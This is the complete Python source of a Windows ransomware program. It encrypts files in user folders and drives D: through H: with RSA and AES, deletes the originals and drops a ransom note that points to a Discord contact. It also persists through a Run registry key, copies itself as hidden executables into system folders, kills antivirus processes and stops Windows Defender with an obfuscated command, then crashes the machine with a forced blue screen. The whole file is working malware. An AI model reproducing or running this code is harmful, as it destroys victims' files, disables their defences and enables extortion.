import os
import sys
import subprocess
import time
import psutil
import ctypes
import threading
import win32api
import win32con
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

class Main:
    def __init__(self):
        self.userPath = os.path.realpath(os.getenv("appdata").replace("\AppData\Roaming", ""))
        self.selfFile = os.path.realpath(sys.argv[0])
        self.desktopPath = os.path.realpath(f"{self.userPath}\\Desktop")
        self.user32 = ctypes.windll.LoadLibrary('user32.dll')
        self.ntdll = ctypes.windll.LoadLibrary('ntdll.dll')

        self.secretCode = "boon si oaiktm"[::-1]
        self.key = RSA.generate(2048)
        self.publicKey = self.key.publickey().export_key()
        self.privateKey = self.key.export_key(passphrase=self.secretCode, pkcs=8, protection="scryptAndAES128-CBC")
        self.publicKeyName = os.path.join(self.desktopPath ,"123.yek")
        self.privateKeyName = os.path.join(self.desktopPath ,"321.yek")
        self.enExtension = ".Hmmmm"

        self.enPaths = [
            f"{self.userPath}\\Desktop",
            f"{self.userPath}\\Downloads",
            f"{self.userPath}\\Pictures",
            f"{self.userPath}\\Documents",
            f"{self.userPath}\\Videos",
            f"{self.userPath}\\Favorites",
            f"{self.userPath}\\Music",
            "D:",
            "E:",
            "F:",
            "G:",
            "H:",
            os.path.dirname(self.selfFile).replace('/', '\\'),
            # ".\\src\\test"
        ]

        self.copySelfPaths = [
            {
                "path": "C:\\Windows\\Fonts",
                "name": "de de de de de de.exe"
            },
            {
                "path": "C:\\Windows\\Offline Web Pages",
                "name": "cxk.exe"
            },
            {
                "path": "C:\\Windows",
                "name": "Trash Combo cleaner.exe"
            },
            {
                "path": self.desktopPath,
                "name": "WHY.exe"
            },
            {
                "path": f"{self.userPath}\\AppData",
                "name": "SYSTEM32.exe"
            },
        ]

    def resourcePath(self, relative_path):
        base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
        return os.path.join(base_path, relative_path)

    def writeKey(self, path, key) -> None:
        with open(path, "wb") as f:
            f.write(key)

    def writeREADME(self, path) -> None:
        with open(f"{path}\\README.txt", "w", encoding='utf-8') as f:
            f.write("""
====================================================================================================
mmmmH :DROWSSAP ROTPYRCED
//:sptth :ETISBEW SIHT MORF ROTPYRCED EHT DAOLNWOD NAC UOY ,**GNIHTYNA YAP OT UOY T'NOD EW**
.DEMMACS %001 UOY ,TI NUR EROFEB SURIV A SI SIHT WONK T'NOD UOY FI ,EKOJ SI SURIV SIHT :GNINRAW
====================================================================================================



!kcul dooG
.loot noitpyrced eht dna yek noitpyrced eht uoy evig lliw I
.3442#921oaiktm :em rof hcraes dna drocsid ot og deen uoy ,selif ruoy revocer ot tnaw uoy fI
.cte ,stnemucod ,soediv ,sotohp ,selif lanosrep ruoy edulcni ,detpyrcne era selif ruoY
            """[::-1])

    def getFiles(self, path) -> list:
        allFiles = []
        for root, dirs, files in os.walk(os.path.realpath(path)):
            for file in files:
                file_path = os.path.realpath(os.path.join(root, file))
                allFiles.append(file_path)

        return allFiles
        
    def enFile(self, path, publicKey) -> bool:
        if not os.path.exists(path): return False
        with open(path, "rb") as f:
            data = f.read()

        sessionKey = get_random_bytes(32)
        cipherRSA = PKCS1_OAEP.new(publicKey)
        encSessionKey = cipherRSA.encrypt(sessionKey)
        cipherAES = AES.new(sessionKey, AES.MODE_EAX)
        ciphertext, tag = cipherAES.encrypt_and_digest(data)
    
        with open(f"{path}{self.enExtension}", "wb") as f:
            f.write(encSessionKey)
            f.write(cipherAES.nonce)
            f.write(tag)
            f.write(ciphertext)
        try:
            os.remove(path)
        except:
            return False

        return True

    def checkFile(self, file) -> bool:
        if file[-len(self.enExtension):] == self.enExtension or \
            file[-4:] == ".exe" or \
            file[-4:] == ".com" or \
            file[-4:] == ".pif" or \
            file[-11:] == "desktop.ini" or \
            file == self.selfFile or \
            file == self.publicKeyName or \
            file == self.privateKeyName or \
            "README.txt" in file: return False

        return True

    def killAntiVirus(self) -> None:
        killAV = killAntiVirus()
        # if killAV.checkPyas(): killAV.killPyas()
        # if killAV.checkDefender(): killAV.killDefender()

    def BSOD(self, errorCode) -> None:
        self.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
        self.ntdll.NtRaiseHardError(errorCode, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))

    def addSetup(self) -> None:
        try:
            key = win32api.RegOpenKey(win32con.HKEY_LOCAL_MACHINE, 'nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\ERAWTFOS'[::-1], 0, win32con.KEY_ALL_ACCESS)
            win32api.RegSetValueEx(key, "mosnar eht yap ot wonk uoy yhw"[::-1], 0, win32con.REG_SZ, self.selfFile)
        except Exception as e:
            ...

    def copySelf(self) -> None:
        for path in self.copySelfPaths: 
            try:
                if not os.path.exists(path["path"]) or os.path.dirname(self.selfFile) == path["path"]: continue
                win32api.CopyFile(self.selfFile, os.path.join(os.path.realpath(path["path"]), path["name"]))
                win32api.SetFileAttributes(os.path.join(os.path.realpath(path["path"]), path["name"]), win32con.FILE_ATTRIBUTE_HIDDEN) 
            except Exception as e:
                ...

    def start(self) -> None:
        if not os.path.exists(self.publicKeyName) or not os.path.exists(self.privateKeyName):
            self.writeKey(self.publicKeyName, self.publicKey)
            self.writeKey(self.privateKeyName, self.privateKey)

        try:
            self.publicKey = RSA.import_key(open(self.publicKeyName).read())
        except:
            self.writeKey(self.publicKeyName, self.publicKey)
            self.publicKey = RSA.import_key(open(self.publicKeyName).read())

        killAVThread = threading.Thread(target=self.killAntiVirus)
        killAVThread.start()

        for path in self.enPaths:
            try: files = self.getFiles(path)
            except: continue

            for file in files:
                try:
                    if self.checkFile(file):
                        self.enFile(file, self.publicKey)
                except:
                    ...

            try: self.writeREADME(path)
            except Exception as e: ...

        self.copySelf() 
        self.addSetup()

        for t in threading.enumerate():
            try:
                t.join()
            except RuntimeError:
                continue
    
        win32api.SetFileAttributes(self.selfFile, win32con.FILE_ATTRIBUTE_HIDDEN) 
        self.user32.SystemParametersInfoW(20, 0, ".\\src\\assets\\black.png", 1)

        try: subprocess.Popen(f"start {self.desktopPath}\\README.txt", shell=True)
        except: ...

        print("Done")
        time.sleep(300)
        self.BSOD(0xc0114514)

class killAntiVirus:
    def __init__(self):
        ...

    def checkDefender(self) -> bool:
        try:
            service = psutil.win_service_get('WdNisSvc')
            service = service.as_dict()
            for i in service:
                if(service[i] == 'running'): return True
                
            return False
        except Exception as e:
            return False

    def checkPyas(self) -> bool:
        for i in psutil.process_iter():
            try:
                if i.name().lower() == "pyas.exe" and f"{i.cwd().lower()}\\{i.name().lower()}" != sys.argv[0].lower(): return True
            except:
                continue

        return False

    def killPyas(self) -> None:
        pyasPath = ""
        for i in psutil.process_iter():
            try:
                if i.name().lower() == "pyas.exe" and f"{i.cwd().lower()}\\{i.name().lower()}" != sys.argv[0].lower():
                    pyasPath = f"{i.cwd()}\\{i.name()}"
                    i.kill()
            except Exception as e:
                continue
        try:
            time.sleep(1)
            os.remove(pyasPath)
        except Exception as e:
            ...
            
    def killDefender(self) -> None:
        cmds = [
            "dnefedniw  eteled cs  ediH:edoMwodniWwohS- T:U- odusN"[::-1],
        ]
        for cmd in cmds:
            try:
                subprocess.Popen(cmd, shell=True)
            except Exception as e:
                continue

if __name__ == "__main__":
    virus = Main()
    virus.start()
